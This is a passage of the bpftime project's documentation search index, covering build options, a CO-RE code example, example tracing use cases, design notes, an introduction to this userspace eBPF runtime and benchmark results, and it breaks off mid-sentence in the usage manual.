https://github.com/eunomia-bpf/bpftime/blob/master/cmake/StandardSettings.cmake forall the build options.</p>"},{"location":"bpftime/documents/build-and-test/#build-and-install-the-complete-runtime-in-release-modewith-ubpf-jit","title":"Build and install the complete runtime in release mode(With ubpf jit)","text":"<pre><code>cmake -Bbuild -DCMAKE_BUILD_TYPE=Release -DBPFTIME_ENABLE_LTO=NO\ncmake --build build --config Release --target install\n</code></pre>"},{"location":"bpftime/documents/build-and-test/#build-and-install-the-complete-runtime-in-debug-modewith-ubpf-jit","title":"Build and install the complete runtime in debug mode(With ubpf jit)","text":"<pre><code>cmake -Bbuild -DCMAKE_BUILD_TYPE=Debug -DBPFTIME_ENABLE_LTO=NO\ncmake --build build --config Debug --target install\n</code></pre>"},{"location":"bpftime/documents/build-and-test/#build-and-install-the-complete-runtime-in-release-modewith-llvm-jit","title":"Build and install the complete runtime in release mode(With llvm jit)","text":"<pre><code>cmake -Bbuild -DCMAKE_BUILD_TYPE=Release -DBPFTIME_ENABLE_LTO=NO -DBPFTIME_LLVM_JIT=YES\ncmake --build build --config RelWithDebInfo --target install\n</code></pre>"},{"location":"bpftime/documents/build-and-test/#compile-with-lto-enabled","title":"Compile with LTO enabled","text":"<p>Just set <code>BPFTIME_ENABLE_LTO</code> to <code>YES</code></p> <p>For example, build  the package, with llvm-jit and LTO enabled:</p> <pre><code>cmake -Bbuild -DCMAKE_BUILD_TYPE=Release -DBPFTIME_ENABLE_LTO=YES -DBPFTIME_LLVM_JIT=YES\ncmake --build build --config RelWithDebInfo --target install\n</code></pre>"},{"location":"bpftime/documents/build-and-test/#compile-with-userspace-verifier","title":"Compile with userspace verifier","text":"<p>Note that we are using https://github.com/vbpf/ebpf-verifier as userspace verifier. It's not perfect, and may not support some features (such as ringbuf)</p> <pre><code>cmake -DBPFTIME_LLVM_JIT=NO -DENABLE_EBPF_VERIFIER=YES -DCMAKE_BUILD_TYPE=Release -B build\ncmake --build build --config Release --target install\n</code></pre>"},{"location":"bpftime/documents/build-and-test/#compile-with-libbpf-disabled","title":"Compile with libbpf disabled","text":"<p>This flag can be used to compile <code>bpftime</code> on macOS. It will disable all the libbpf related libraries and features that are used in bpftime.</p> <pre><code>cmake -Bbuild -DCMAKE_BUILD_TYPE:STRING=RelWithDebInfo -DBPFTIME_BUILD_WITH_LIBBPF=OFF -DBPFTIME_BUILD_KERNEL_BPF=OFF\ncmake --build build --config RelWithDebInfo  --target install -j$(JOBS)\n</code></pre>"},{"location":"bpftime/documents/build-and-test/#testing-targets","title":"Testing targets","text":"<p>We have some targets for unit testing, they are:</p> <ul> <li><code>bpftime_daemon_tests</code></li> <li><code>bpftime_runtime_tests</code></li> <li><code>llvm_jit_tests</code></li> </ul> <p>These targets will only be enabled when <code>BPFTIME_ENABLE_UNIT_TESTING</code> was set to <code>YES</code>.</p> <p>Build and run them to test, for example:</p> <pre><code>cmake -DCMAKE_PREFIX_PATH=/usr/include/llvm -DBPFTIME_LLVM_JIT=YES -DBPFTIME_ENABLE_UNIT_TESTING=YES -DCMAKE_BUILD_TYPE=Release -B build\ncmake --build build --config RelWithDebInfo --target bpftime_runtime_tests\nsudo ./build/runtime/unit-test/bpftime_runtime_tests\n</code></pre>"},{"location":"bpftime/documents/build-and-test/#compile-only-the-vm-no-runtime-no-uprobe","title":"Compile only the vm (No runtime, No uprobe)","text":"<p>For a lightweight build without the runtime (only vm library and LLVM JIT):</p> <pre><code>make build-vm # build the simple vm with a simple jit\nmake build-llvm # build the vm with llvm jit\n</code></pre>"},{"location":"bpftime/documents/build-and-test/#more-compile-options","title":"More compile options","text":"<p>See https://github.com/eunomia-bpf/bpftime/blob/master/cmake/StandardSettings.cmake for all cmake build options.</p> <p>Share on  Share on </p>"},{"location":"bpftime/documents/co-re/","title":"Compile Once, Run Everywhere(CO-RE)","text":"<p>You can simply provide the external BTF for userspace host application in your eBPF program:</p> <pre><code>    LIBBPF_OPTS(bpf_object_open_opts , opts,\n    );\n    LIBBPF_OPTS(bpf_uprobe_opts, uprobe_opts);\n    if (argc != 3 &amp;&amp; argc != 2) {\n        fprintf(stderr, \"Usage: %s &lt;example-name&gt; [&lt;external-btf&gt;]\\n\", argv[0]);\n        return 1;\n    }\n    if (argc == 3)\n        opts.btf_custom_path = argv[2];\n\n    /* Set up libbpf errors and debug info callback */\n    libbpf_set_print(libbpf_print_fn);\n\n    /* Cleaner handling of Ctrl-C */\n    signal(SIGINT, sig_handler);\n    signal(SIGTERM, sig_handler);\n\n    /* Load and verify BPF application */\n    skel = uprobe_bpf__open_opts(&amp;opts);\n    if (!skel) {\n        fprintf(stderr, \"Failed to open and load BPF skeleton\\n\");\n        return 1;\n    }\n</code></pre> <p>This is the same usage as enabling CO-RE on older kernel versions without BTF information. Also, you need to record the data structs in the BTF info of the eBPF program, for example, if you want <code>struct data</code> to be relocated:</p> <pre><code>#define BPF_NO_GLOBAL_DATA\n// #define BPF_NO_PRESERVE_ACCESS_INDEX\n#include &lt;vmlinux.h&gt;\n#include &lt;bpf/bpf_helpers.h&gt;\n#include &lt;bpf/bpf_tracing.h&gt;\n\n#ifndef BPF_NO_PRESERVE_ACCESS_INDEX\n#pragma clang attribute push (__attribute__((preserve_access_index)), apply_to = record)\n#endif\n\nstruct data {\n        int a;\n        int c;\n        int d;\n};\n\n#ifndef BPF_NO_PRESERVE_ACCESS_INDEX\n#pragma clang attribute pop\n#endif\n\n\nSEC(\"uprobe/examples/btf-base:add_test\")\nint BPF_UPROBE(add_test, struct data *d)\n{\n    int a = 0, c = 0;\n    bpf_probe_read_user(&amp;a, sizeof(a), &amp;d-&gt;a);\n    bpf_probe_read_user(&amp;c, sizeof(c), &amp;d-&gt;c);\n    bpf_printk(\"add_test(&amp;d) %d + %d = %d\\n\", a, c,  a + c);\n    return a + c;\n}\n\nchar LICENSE[] SEC(\"license\") = \"Dual BSD/GPL\";\n</code></pre> <p>In fact, the BTF implementation for relocation requires two parts: the compile-time BTF information carried by the BPF program, and the BTF information of the kernel when loading the eBPF program. When actually loading the eBPF program, libbpf will modify potentially incorrect eBPF instructions based on the accurate BTF information of the current kernel, ensuring compatibility across different kernel versions.</p> <p>Interestingly, libbpf does not differentiate whether these BTF information come from user-space programs or the kernel. Therefore, by merging the user-space BTF information with kernel BTF and provide them to libbpf, the problem is solved.</p> <p>For more details, please see our blog Expanding eBPF Compile Once, Run Everywhere(CO-RE) to Userspace Compatibility. The CO-RE can also be used in kernel eBPF for userspace applications.</p> <p>Share on  Share on </p>"},{"location":"bpftime/documents/contact/","title":"Contact and citations","text":"<p>Have any questions or suggestions on future development? Free free to open an issue or contact yunwei356@gmail.com and team@eunomia.dev!</p> <p>Our arxiv preprint: https://arxiv.org/abs/2311.07923</p> <pre><code>@misc{zheng2023bpftime,\n      title={bpftime: userspace eBPF Runtime for Uprobe, Syscall and Kernel-User Interactions}, \n      author={Yusheng Zheng and Tong Yu and Yiwei Yang and Yanpeng Hu and XiaoZheng Lai and Andrew Quinn},\n      year={2023},\n      eprint={2311.07923},\n      archivePrefix={arXiv},\n      primaryClass={cs.OS}\n}\n</code></pre> <p>Our discord:  https://discord.gg/jvM73AFdB8</p> <p>Share on  Share on </p>"},{"location":"bpftime/documents/examples/","title":"Examples &amp; Use Cases","text":""},{"location":"bpftime/documents/examples/#table-of-contents","title":"Table of Contents","text":"<ul> <li>Examples \\&amp; Use Cases</li> <li>Table of Contents</li> <li>minimal examples</li> <li>Tracing the system<ul> <li>Tracing userspace functions with uprobe</li> <li>tracing all syscalls with tracepoints</li> <li>bpftrace</li> <li>Use bpftime to trace SPDK</li> </ul> </li> <li>Error injections</li> <li>Nginx eBPF module</li> <li>Use DPDK with userspace eBPF to run XDP seamlessly</li> <li>Use the vm only(No runtime, No uprobe) as a library</li> </ul>"},{"location":"bpftime/documents/examples/#minimal-examples","title":"minimal examples","text":"<p>See example/minimal and usdt_minimal.</p> <p>The bpftime supports the following types of eBPF programs:</p> <ul> <li><code>uprobe/uretprobe</code>: trace userspace functions at start or and.</li> <li><code>syscall tracepoints</code>: trace the specific syscall types.</li> <li><code>USDT</code>: trace the userspace functions with USDT.</li> </ul> <p>You may use <code>bpf_override_return</code> to change the control flow of the program.</p> <p>See documents/available-features.md for more details.</p>"},{"location":"bpftime/documents/examples/#tracing-the-system","title":"Tracing the system","text":""},{"location":"bpftime/documents/examples/#tracing-userspace-functions-with-uprobe","title":"Tracing userspace functions with uprobe","text":"<p>Attach uprobe, uretprobe or all syscall tracepoints(currently x86 only) eBPF programs to a process or a group of processes</p> <ul> <li><code>malloc</code>: count the malloc calls in libc by pid. demonstrate how to use the userspace <code>uprobe</code> with basic <code>hashmap</code>.</li> <li><code>bashreadline</code>: Print entered bash commands from running shells,</li> <li><code>sslsniff</code>: Trace and print all SSL/TLS connections and raw traffic data.</li> </ul>"},{"location":"bpftime/documents/examples/#tracing-all-syscalls-with-tracepoints","title":"tracing all syscalls with tracepoints","text":"<ul> <li><code>opensnoop</code>: trace file open or close syscalls in a process. demonstrate how to use the userspace <code>syscall tracepoint</code> with <code>ring buffer</code> output.</li> </ul> <p>More bcc/libbpf-tools examples can be found in example/libbpf-tools.</p>"},{"location":"bpftime/documents/examples/#bpftrace","title":"bpftrace","text":"<p>You can also run bpftime with <code>bpftrace</code>, we've test it on this commit.</p> <p>It should be able to work with the bpftrace from the package manager of your distribution, for example:</p> <pre><code>sudo apt install bpftrace\n</code></pre> <p>Or you can build the latest bpftrace from source.</p> <p>More details about how to run bpftrace in usespace, can be found in example/bpftrace.</p>"},{"location":"bpftime/documents/examples/#use-bpftime-to-trace-spdk","title":"Use bpftime to trace SPDK","text":"<p>See https://github.com/eunomia-bpf/bpftime/wiki/Benchmark-of-SPDK for how to use bpftime to trace SPDK.</p>"},{"location":"bpftime/documents/examples/#error-injections","title":"Error injections","text":"<ul> <li><code>error-injection</code> Inject errors into userspace functions or syscalls to test its error handling capabilities.</li> </ul>"},{"location":"bpftime/documents/examples/#nginx-ebpf-module","title":"Nginx eBPF module","text":"<p>A nginx eBPF module is implemented with bpftime, which can be used to extend nginx with eBPF programs.</p> <p>See https://github.com/eunomia-bpf/Nginx-eBPF-module</p>"},{"location":"bpftime/documents/examples/#use-dpdk-with-userspace-ebpf-to-run-xdp-seamlessly","title":"Use DPDK with userspace eBPF to run XDP seamlessly","text":"<p>See https://github.com/eunomia-bpf/XDP-eBPF-in-DPDK</p> <p>We can run the same eBPF XDP program in both kernel and userspace, and the userspace eBPF program can be used to run XDP programs seamlessly. Unlike ubpf in DPDK, we don't need to modify the eBPF program, and can support eBPF maps</p>"},{"location":"bpftime/documents/examples/#use-the-vm-onlyno-runtime-no-uprobe-as-a-library","title":"Use the vm only(No runtime, No uprobe) as a library","text":"<p>The LLVM JIT or AOT can be used as a library, without the runtime and uprobe.</p> <p>See the examples:</p> <ol> <li>Cli: https://github.com/eunomia-bpf/bpftime/tree/master/vm/cli</li> <li>Simple example: https://github.com/eunomia-bpf/bpftime/tree/master/vm/example</li> </ol> <p>Share on  Share on </p>"},{"location":"bpftime/documents/how-it-works/","title":"The design and implementation of bpftime","text":"<p>The hook implementation is based on binary rewriting and the underly technique is inspired by:</p> <ul> <li>Userspace function hook: frida-gum</li> <li>Syscall hooks: zpoline: a system call hook mechanism based on binary rewriting and pmem/syscall_intercept.</li> </ul> <p>For more details about how to implement the inline hook, please refer to our blog: Implementing an Inline Hook in C in 5 minutes and the demo https://github.com/eunomia-bpf/inline-hook-demo</p> <p>The injection of userspace eBPF runtime into a running program is based on ptrace and also provided by frida-gum library.</p> <p>How the bpftime work entirely in userspace:</p> <p></p> <p>How the bpftime work with kernel eBPF:</p> <p></p> <p>For more details, please refer to:</p> <ul> <li>Slides: https://eunomia.dev/bpftime/documents/userspace-ebpf-bpftime-lpc.pdf</li> <li>arxiv: https://arxiv.org/abs/2311.07923</li> </ul> <p>Share on  Share on </p>"},{"location":"bpftime/documents/introduction/","title":"Introduction","text":"<p>Yusheng Zheng, Yu Tong</p> <p>eBPF is a revolutionary technology that originated in the Linux kernel, enabling sandboxed programs to run within the operating system's kernel. It is used to safely and efficiently extend the kernel's capabilities without altering its source code or loading kernel modules.</p> <p>In this blog, we are excited to introduce a new open-source user-space eBPF runtime: https://github.com/eunomia-bpf/bpftime. bpftime further expands the capabilities of eBPF, allowing existing eBPF tools and applications, such as BCC tools, bpftrace, Deepflow, etc., to run in non-privileged user space without any code modifications, while using the same libraries and toolchains as kernel eBPF.</p> <p>bpftime not only provides dynamic tracing or extension mechanisms like Uprobe and system call tracepoints, but also offers an order of magnitude performance improvement over kernel Uprobe. Moreover, like kernel eBPF, it requires no manual code instrumentation or process restarts. bpftime supports inter-process eBPF maps through user-space shared memory, while being compatible with kernel eBPF maps, enabling seamless operations with kernel eBPF infrastructure. Additionally, it includes high-performance LLVM JIT/AOT compilers for various architectures, as well as a lightweight JIT and interpreter for x86. Through performance data and real-world examples, we will demonstrate how bpftime can be effective in the real world and provide insights into its future development. We hope bpftime will bring unprecedented performance and flexibility to system monitoring, analysis, and extension. We also introduced the design and implementation of bpftime at the Linux plumbers 23 conference[2].</p>"},{"location":"bpftime/documents/introduction/#ebpf-system-extension-from-kernel-to-user-space","title":"eBPF: System Extension from Kernel to User Space","text":"<p>eBPF (extended Berkeley Packet Filter) has evolved from a simple network packet filtering tool into a versatile system-level extension technology. Since the inception of BPF in the 1990s, eBPF has significantly enhanced its functionality through an expanded instruction set and direct interaction with kernel data structures. After joining the Linux kernel in 2014, eBPF became a powerful bytecode engine, widely used in performance analysis, security policies, and other areas. With the growing complexity of computing environments, eBPF's real-time data collection and analysis capabilities have become crucial in modern computing, especially in traffic control, load balancing, and security policies.</p> <p>Although eBPF was initially designed for the kernel, its tremendous potential in user space, coupled with the kernel's GPL LICENSE restrictions, led to the development of early user-space eBPF runtimes like ubpf[3] and rbpf[4]. These runtimes allowed developers to execute eBPF bytecode outside the kernel, breaking free from GPL license restrictions and offering a more intuitive and convenient debugging environment. However, writing programs for ubpf and rbpf might require a specific, not fully kernel-compatible toolchain, and they only had limited single-threaded hash maps implementations, making it difficult to run actual eBPF programs. Additionally, ubpf and rbpf are essentially eBPF bytecode virtual machines that still require glue code to compile and link with other user-space programs for practical use, and they did not offer dynamic tracing functionality.</p> <p>In practice, user-space eBPF has been explored and applied in fields like network processing, blockchain, and security. For example, Oko and DPDK eBPF support demonstrate the flexibility and performance advantages of eBPF in network data processing. The Solana project utilized eBPF to implement a JIT compiler, supporting the execution of blockchain smart contracts. The eBPF for Windows project extended eBPF functionality beyond Linux, showcasing its potential for cross-platform compatibility. These applications not only demonstrate eBPF's powerful system extension capabilities but also highlight its significance and wide applicability in the modern computing domain. For further discussion, refer to our previous blog: https://eunomia.dev/blogs/userspace-ebpf/.</p>"},{"location":"bpftime/documents/introduction/#why-we-need-bpftime","title":"Why We Need bpftime","text":"<p>Due to the core role of operating system kernels and the high demands for stability and security, innovation and evolution in operating system kernels tend to be slow. This is the original intention behind eBPF: to extend the kernel's functionality without changing its source code, thereby bringing more innovative application scenarios[5]. This is also the impact we hope bpftime will have: exploring more development possibilities with the safety and ecosystem brought by eBPF, without changing user-space program code, and compensating for the potential shortcomings of current kernel-space eBPF and other user-space extension solutions.</p>"},{"location":"bpftime/documents/introduction/#limitations-of-kernel-space-implementation-of-user-space-tracing-uprobe-and-system-call-tracing","title":"Limitations of Kernel-Space Implementation of User-Space Tracing (Uprobe) and System Call Tracing","text":"<p>Uprobe is a powerful user-level dynamic tracing mechanism that allows developers to perform dynamic instrumentation in user-space programs, such as at function entry points, specific code offsets, and function return points. This technology is implemented by setting breakpoints at designated locations, such as using the int3 instruction on x86 architecture. When the execution flow reaches this point, the program traps into the kernel, triggering an event, then executing a predefined probe function, and finally returning to user-space to continue execution. This dynamic tracing method can trace and instrument all processes executing a specific file across the system, allowing for the collection of critical data for performance analysis and fault diagnosis without modifying code, recompiling, or restarting processes.</p> <p>However, since the eBPF virtual machine executes in kernel mode, the current Uprobe implementation introduces two context switches in the kernel, causing significant performance overhead, especially impacting performance in latency-sensitive applications. As shown in the diagram, Uprobe's overhead is nearly ten times that of Kprobe[5]. On the other hand, Uprobe is currently limited to tracing and cannot modify the execution flow or return values of user-space functions, limiting its use cases to code extension, hot patching, defect injection, etc. Despite this, Uprobe is still widely used in production environments for its non-intrusive user-space functionality tracing, such as tracing user-space protocols like SSL/TLS and HTTP2, monitoring memory allocation and leaks, analyzing garbage collection and language runtimes, and tracking the creation and recycling of coroutines, among other scenarios.</p> <p></p> <p>For system call tracepoints, since they are globally visible, additional filtering is required for specific process tracing, such as filtering based on pid, cgroup, etc., in eBPF[6], which also brings some additional overhead to other processes that do not need to be traced.</p>"},{"location":"bpftime/documents/introduction/#limitations-of-kernel-space-ebpf-in-terms-of-security-and-extensibility","title":"Limitations of Kernel-Space eBPF in Terms of Security and Extensibility","text":"<p>eBPF running in kernel mode has its limitations in terms of security and extensibility. On one hand, eBPF programs need to run in kernel mode, meaning they require root privileges, thereby increasing the attack surface and potential risks, such as container escape. Moreover, vulnerabilities in eBPF itself can lead to security issues at the kernel level. On the other hand, while the verifier restricts eBPF programs to ensure safety, this also limits the functionality expansion of eBPF; any new feature or improvement requires modifications to the kernel code. These limitations not only increase the maintenance difficulty of the system but also reduce the flexibility and universality of eBPF.</p> <p>For kernels without eBPF support (e.g., older systems) or applications in non-privileged containers, user-space eBPF runtimes are a viable alternative, allowing the execution of eBPF programs for tracing, analysis, and extension operations without kernel eBPF support.</p>"},{"location":"bpftime/documents/introduction/#shortcomings-of-other-user-space-extension-solutions","title":"Shortcomings of Other User-Space Extension Solutions","text":"<p>Currently, there are other user-space tracing and extension solutions, such as gdb and other tools that use the ptrace mechanism for process tracing and analysis, Wasm, Lua virtual machines that can be used as plugin runtimes, and binary instrumentation tools like Frida for dynamic tracing in user space. However, these solutions have their own limitations.</p> <ul> <li><code>High Performance Overhead</code>: Traditional tools like gdb use the ptrace mechanism for process tracing. Although they are powerful, they introduce significant performance overhead when analyzing and interacting with other processes. This method frequently pauses and resumes the target process, leading to reduced efficiency. Additionally, ptrace limits the number of processes that can be traced simultaneously in the system, making large-scale distributed tracing infeasible. WebAssembly (Wasm) sandboxes, while offering good flexibility and cross-language support, require strict validation and runtime checks when executing external libraries or procedures, potentially introducing performance losses. In contrast, eBPF offers a more performance-centric strategy, using static analysis and a verifier to ensure safe execution of code on the host without additional runtime overhead. For bpftime, since it embeds the eBPF virtual machine in the function call context of the traced process without extra context switches, it has lower performance overhead.</li> <li><code>Security Issues</code>: Binary instrumentation tools like Frida provide dynamic tracing capabilities, but this can introduce security issues. The instrumentation code runs in the same process context and can be maliciously exploited. Additionally, code defects in the tracing tools or scripts themselves may cause the traced program to crash, such as accessing incorrect addresses or pointers. In contrast, eBPF can ensure the safety of code through its verifier.</li> <li><code>Insufficient Visibility</code>: Additionally, for other user-space tracing solutions, these tools typically only offer visibility into single processes and cannot provide system-wide insights. They struggle to capture a global view of kernel-level events or cross-process communications, limiting their analytical capabilities in complex systems. This is why eBPF and other solutions mainly perform tracing in kernel space, allowing for correlated analysis of kernel and user-space events, such as linking layer 7 network packets with kernel-level network events, or associating user-space function call behavior with kernel-level system calls, thus providing more comprehensive analytical capabilities. For bpftime, it can be more than just a user-space virtual machine solution. User-space eBPF can work in conjunction with kernel-space eBPF infrastructure to achieve boundary-crossing analysis and extension capabilities.</li> </ul> <p>For existing other user-space eBPF runtimes, as mentioned earlier, they lack dynamic tracing or extension capabilities, require manual integration, and cannot directly utilize existing eBPF toolchains and applications, which greatly limits their use cases. On the other hand, they cannot work directly with kernel-space eBPF, only offering limited user-space extension capabilities.</p>"},{"location":"bpftime/documents/introduction/#bpftime-user-space-ebpf-runtime","title":"bpftime: User-Space eBPF Runtime","text":""},{"location":"bpftime/documents/introduction/#user-space-ebpf-runtime-compatible-with-existing-ebpf-tools-and-frameworks","title":"User-Space eBPF Runtime Compatible with Existing eBPF Tools and Frameworks","text":"<p>bpftime aims to maintain good compatibility with existing kernel eBPF as a user-space alternative and improvement to kernel eBPF. It also seeks to maximize the use of the rich ecosystem and tools of existing eBPF. For example, bpftime allows the direct use of unmodified bpftrace tools to execute eBPF scripts in user space, tracing system calls or user-space functions:</p> <p></p> <p>At the same time, it can run user-space versions of BCC/libbpf-tools such as bashreadline, funclatency, gethostlatency, mountsnoop, opensnoop, sigsnoop, statsnoop, syscount, etc[7]. bpftime constructs eBPF map data structures in user-space shared memory, enabling the analysis and statistics of multiple processes, and supports reporting data to tracing tools through ring buffer, perf buffer, and other means.</p> <p>bpftime also provides eBPF infrastructure compatible with the kernel in user-space. It can run without needing kernel eBPF and supports some of the kernel's eBPF maps, helpers, dynamic tracing mechanisms, and almost all eBPF instruction sets:</p> <p></p> <p>From a security perspective, bpftime provides an eBPF verifier to ensure the safety of eBPF bytecode, preventing malicious code injection or damaging the traced process. bpftime can use the kernel's eBPF verifier or an independent user-space eBPF verifier as an alternative for environments without access to kernel eBPF.</p>"},{"location":"bpftime/documents/introduction/#high-performance-uprobe-and-system-call-tracing","title":"High-Performance Uprobe and System Call Tracing","text":"<p>bpftime supports Uprobe and system call tracing by embedding eBPF programs into the function call context of the traced process through binary rewriting, thus achieving dynamic tracing and extension. This method not only avoids context switching between kernel and user spaces but also collects key data for performance analysis and fault diagnosis without modifying code, recompiling, or restarting processes. Compared to kernel Uprobe, bpftime's Uprobe implementation is more performant and offers more functionalities, such as modifying function return values or altering function execution flows, enabling code extension, hot patching, and defect injection. The performance of user-space Uprobe implemented by bpftime can be an order of magnitude higher than that of kernel Uprobe:</p> Probe/Tracepoint Types Kernel (ns) Userspace (ns) Uprobe 3224.172760 314.569110 Uretprobe 3996.799580 381.270270 Syscall Trace 151.82801 232.57691 <p>Using dynamic library injection implemented via ptrace and technologies like LD_PRELOAD, bpftime's eBPF runtime supports tracing during program startup and also allows mounting eBPF probes directly onto multiple running processes. We conducted a test where a probe monitoring the malloc function in libc was loaded using bpftime, and the loading latency was measured. The results showed that bpftime caused the running process to pause for about 48 milliseconds during loading. For comparison, we used the LD_PRELOAD method to load the same extension before the process started and observed a loading latency of 30 milliseconds.</p> <p>We used the sslsniff tool[8] to trace and analyze SSL encrypted traffic of Nginx in bpftime's user-space Uprobe and compared it with the kernel Uprobe approach, observing a significant performance improvement:</p> <p></p> <p>For modern eBPF observability tools, it may be necessary to collect and analyze the same event in both kernel and user-space functions. For instance, an HTTP request might require analyzing both kernel-level network events and user-space function calls to obtain a complete request chain. bpftime's Uprobe implementation can work in conjunction with kernel eBPF kprobes, enabling this kind of cross-boundary analysis capability. Implementing and improving other dynamic tracing mechanisms are also part of our plan.</p>"},{"location":"bpftime/documents/introduction/#new-ebpf-jit-and-aot-compilers","title":"New eBPF JIT and AOT Compilers","text":"<p>bpftime includes a new LLVM-based eBPF JIT compiler that compiles eBPF bytecode into native machine code at runtime, thereby improving the execution efficiency of eBPF programs. Compared to other user-space eBPF runtime JIT compilers like ubpf and rbpf, and Wasm, the LLVM JIT compiler offers better performance, approaching the efficiency of native code execution. It also provides better cross-platform support, for example, supporting architectures like RISC-V. We conducted a simple performance comparison and analysis[9]:</p> <p></p> <p>In addition to JIT, bpftime also includes an AOT compiler, which allows eBPF bytecode to be pre-compiled into machine code files for specific architectures after verification. This can be particularly useful for deployment and use in embedded systems, significantly reducing the time for compilation at startup.</p>"},{"location":"bpftime/documents/introduction/#more-exploratory-use-cases-and-future-developments","title":"More Exploratory Use Cases and Future Developments","text":"<p>Beyond extending previous Uprobe and system call tracepoints, bpftime can also be used for other exploratory use cases, such as:</p> <ul> <li><code>Fault Injection</code>: Using the kernel-compatible bpf_override_return() helper[10], bpftime can modify the Syscall return values of processes, block specific Syscalls, or modify and replace specific function calls in certain types of eBPF programs. This enables fault injection capabilities. Kernel Uprobe itself does not support this functionality, and kernel's <code>bpf_override_return</code> also requires enabling the CONFIG_BPF_KPROBE_OVERRIDE option at compile time for security reasons, which is not enabled by default in mainstream Linux distributions.</li> <li><code>Hot Patching</code>: As mentioned earlier, using the bpf_override_return helper mechanism, user-space eBPF can also replace or filter certain function calls, thus enabling hot patching capabilities.</li> <li><code>eBPF-based Nginx Module</code>: bpftime can be used as an Nginx Module to implement extensions in Nginx through eBPF, such as dynamic routing, load balancing, caching, security policies, etc., in Nginx.</li> <li><code>Enhancing Fuse</code>: There have been attempts to optimize Fuse using eBPF in the kernel. bpftime could also be used as part of a user-space filesystem, modifying the behavior of system calls in the corresponding user-space process through eBPF, enabling filesystem extensions such as dynamic routing, caching, security policies, etc., in user-space filesystems.</li> </ul> <p>bpftime is currently an early-stage exploratory project. We are actively exploring more potential application scenarios, such as implementing eBPF-based network packet filtering in user space, optimizing packet forwarding performance for service meshes, bypassing the kernel's network protocol stack, and more. We look forward to more ideas and suggestions from everyone, or working together to implement these functions. In the future, we also hope that bpftime can offer better compatibility support for the kernel and, with the help of LLVM's JIT compiler, provide better performance optimization guidance, and a more convenient testing and debugging</p>"},{"location":"bpftime/documents/introduction/#conclusion","title":"Conclusion","text":"<p>bpftime opens up new possibilities for eBPF applications in user space and provides new options for extending user-space applications. It allows existing eBPF applications to run in non-privileged user space using the same libraries and toolchains, and offers tracing mechanisms like Uprobe and Syscall for user-space eBPF. Compared to kernel Uprobe, it significantly improves performance and does not require manual code instrumentation or process restarts. The runtime supports inter-process eBPF maps in user-space shared memory, and is also compatible with kernel eBPF maps, allowing seamless operation with the kernel eBPF infrastructure.</p> <p>bpftime is now open source on GitHub, and everyone is welcome to try it out and provide feedback: https://github.com/eunomia-bpf/bpftime If you have any suggestions or questions, feel free to raise an issue on GitHub or contact us by email at yunwei356@gmail.com.</p> <ul> <li>Slides: https://eunomia.dev/bpftime/documents/userspace-ebpf-bpftime-lpc.pdf</li> <li>Hack news: https://news.ycombinator.com/item?id=38268958</li> <li>arxiv: https://arxiv.org/abs/2311.07923</li> </ul>"},{"location":"bpftime/documents/introduction/#references","title":"References","text":"<ol> <li>bpftime Git repo: https://github.com/eunomia-bpf/bpftime</li> <li>bpftime Linux Plumbers talk: https://lpc.events/event/17/contributions/1639/</li> <li>ubpf: https://github.com/iovisor/ubpf</li> <li>rbpf: https://github.com/qmonnet/rbpf</li> <li>Performance comparison of uprobe and kprobe: https://dl.acm.org/doi/10.1145/3603269.3604823</li> <li>Capturing Opening Files and Filter with Global Variables: https://eunomia.dev/tutorials/4-opensnoop/</li> <li>examples: https://github.com/eunomia-bpf/bpftime/tree/master/example</li> <li>sslsniff, based on the tool of the same name in bcc: https://github.com/eunomia-bpf/bpftime/tree/master/example/sslsniff</li> <li>bpf benchmark: https://github.com/eunomia-bpf/bpf-benchmark</li> <li>BPF-based error injection for the kernel: https://lwn.net/Articles/740146/</li> <li>FUSE BPF: A Stacked Filesystem Extension for FUSE: https://lwn.net/Articles/915717/</li> </ol> <p>Share on  Share on </p>"},{"location":"bpftime/documents/performance/","title":"performance and benchmark","text":"<p>More performance and benchmark results will be added in the future. If you have any interesting usecases or ideas, feel free contact us!</p>"},{"location":"bpftime/documents/performance/#table-of-contents","title":"Table of Contents","text":"<ul> <li>performance and benchmark</li> <li>Table of Contents</li> <li>Improve performance</li> <li>Benchmark<ul> <li>Microbenchmark</li> <li>sslsniff: trace SSL/TLS connections and raw traffic data</li> </ul> </li> </ul>"},{"location":"bpftime/documents/performance/#improve-performance","title":"Improve performance","text":"<p>There are several configs to improve the performance of bpftime:</p> <ol> <li>Use JIT when running the eBPF program. The JIT will be enabled by default in the future after more tests. See documents/usage.md for more details.</li> <li>Compile with LTO enabled. See documents/build-and-test.md for more details.</li> <li>Use LLVM JIT instead of ubpf JIT. See documents/build-and-test.md for more details.</li> <li>Disable logs. See documents/usage.md for more details.</li> </ol> <p>The benchmark results are based on the above configs.</p>"},{"location":"bpftime/documents/performance/#benchmark","title":"Benchmark","text":""},{"location":"bpftime/documents/performance/#microbenchmark","title":"Microbenchmark","text":"<p>See https://github.com/eunomia-bpf/bpftime/tree/master/benchmark for how we run the benchmark.</p> Probe/Tracepoint Types Kernel (ns) Userspace (ns) Uprobe 3224.172760 314.569110 Uretprobe 3996.799580 381.270270 Syscall Tracepoint 151.82801 232.57691 Embedding runtime Not avaliable 110.008430"},{"location":"bpftime/documents/performance/#sslsniff-trace-ssltls-connections-and-raw-traffic-data","title":"sslsniff: trace SSL/TLS connections and raw traffic data","text":"<p>We used the sslsniff tool to trace and analyze SSL encrypted traffic of Nginx in bpftime's user-space Uprobe and compared it with the kernel Uprobe approach, observing a significant performance improvement:</p> <p></p> <p>The benchmark script and results can be found in benchmark/sslsniff.</p> <p>Share on  Share on </p>"},{"location":"bpftime/documents/usage/","title":"Manual","text":"<p>\ud83d\udea7 It's at an early stage and may contain bugs on more platforms and eBPF programs. We are working on to improve the stability and compatibility. It's not suitable for production use now.</p> <p>If you find any bugs or suggestions, please feel free to open an issue, thanks!</p>"},{"location":"bpftime/documents/usage/#table-of-contents","title":"Table of Contents","text":"<ul> <li>Manual</li> <li>Table of Contents</li> <li>Uprobe and uretprobe</li> <li>Syscall tracing</li> <li>Run with LD_PRELOAD directly</li> <li>Configurations for runtime<ul> <li>Run with JIT enabled or disabled</li> <li>Run with kernel eBPF and kernel verifier</li> <li>Control Log Level</li> <li>Controlling the Log Path</li> <li>Allow external maps</li> <li>Set memory size for shared memory maps</li> </ul> </li> <li>Verifier</li> </ul>"},{"location":"bpftime/documents/usage/#uprobe-and-uretprobe","title":"Uprobe and uretprobe","text":"<p>With <code>bpftime</code>, you can build eBPF applications using familiar tools like clang and libbpf, and execute them in userspace. For instance, the <code>malloc</code> eBPF program traces malloc calls using uprobe and aggregates the counts using a hash map.</p> <p>You can refer to documents/build-and-test.md for how to build the 